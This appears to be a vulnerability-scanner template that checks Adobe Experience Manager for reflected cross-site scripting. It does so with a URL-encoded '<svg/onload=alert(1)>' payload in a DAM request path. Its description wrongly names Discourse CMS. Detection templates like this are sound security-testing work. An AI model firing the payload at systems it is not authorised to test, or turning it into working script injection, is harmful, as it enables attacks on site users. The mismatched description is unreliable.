id: aem-xss
info:
  author: 0xParthJ
  description: Cross-site scripting (XSS) on Discourse CMS
  name: AEM - XSS
  severity: medium
  tags: xss,aem
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <svg/onload=alert(1)>
  - part: header
    type: word
    words:
    - text/html
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/dam/jcr:content/xxxxxxxxxxxx%27\%22%3E%3Csvg/onload=alert(1)%3E.childrenlist.json.json/ab.html'
